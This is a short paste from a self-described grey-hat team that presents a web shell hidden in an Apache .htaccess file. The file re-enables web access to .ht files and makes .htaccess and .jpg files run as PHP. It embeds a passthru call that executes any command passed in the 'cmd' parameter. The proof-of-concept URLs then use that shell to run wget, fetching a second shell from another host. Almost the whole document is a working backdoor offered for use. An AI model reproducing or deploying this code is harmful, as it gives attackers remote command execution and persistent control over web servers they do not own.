Simple Shell with .htaccess and .jpg
--------------------------------------------------------
__________                  _________ _______       .___________  
\____    /___________  ____ \_   ___ \\   _  \    __| _/\_____  \ Team
  /     // __ \_  __ \/  _ \/    \  \//  /_\  \  / __ |   _(__  < 
 /     /\  ___/|  | \(  <_> )     \___\  \_/   \/ /_/ |  /       \
/_______ \___  >__|   \____/ \______  /\_____  /\____ | /______  /
        \/   \/                     \/       \/      \/        \/ 

ZeroC0d3 Team
[ N0th1ng Imp0ss1bl3, Grey Hat Coder ]
--------------------------------------------------------
http://pastebin.com/u/zeroc0d3   

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>
 
# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess
AddType application/x-httpd-php .jpg
 
##### SHELL ######
<?php echo "\n";passthru($_GET['cmd']." 2>&1"); ?>
 
POC :
---------------------
yoursite.com/.htaccess?cmd=wget -O zeroc0d3.php http://yourothersitewithshell/yourshell.txt
yoursite.com/pic.jpg?cmd=wget -O zeroc0d3.php http://yourothersitewithshell/yourshell.txt
